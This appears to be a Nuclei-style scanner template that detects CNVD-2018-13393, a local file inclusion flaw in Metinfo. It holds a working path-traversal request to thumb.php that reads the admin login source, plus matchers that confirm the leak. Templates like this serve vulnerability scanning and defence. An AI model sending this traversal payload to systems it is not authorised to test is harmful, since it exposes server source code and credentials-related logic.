id: CNVD-2018-13393
info:
  name: Metinfo - Local File Inclusion
  author: ritikchaddha
  severity: high
  description: Metinfo, a software program, has a vulnerability called CNVD-2018-13393
    that allows an attacker to locally access files.
  reference:
  - https://paper.seebug.org/676/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cwe-id: CWE-22
  tags: metinfo,cnvd,cvnd2018,lfi
  metadata:
    impact: The impact of CNVD-2018-13393 on Metinfo is the vulnerability to local
      file inclusion.
    recommendation: I recommend immediately addressing the vulnerability in Metinfo
      to mitigate the risk of local file inclusion.
requests:
- method: GET
  path:
  - '{{BaseURL}}/include/thumb.php?dir=http\..\admin\login\login_check.php'
  host-redirects: true
  max-redirects: 2
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - <?php
    - login_met_cookie($metinfo_admin_name);
    condition: and
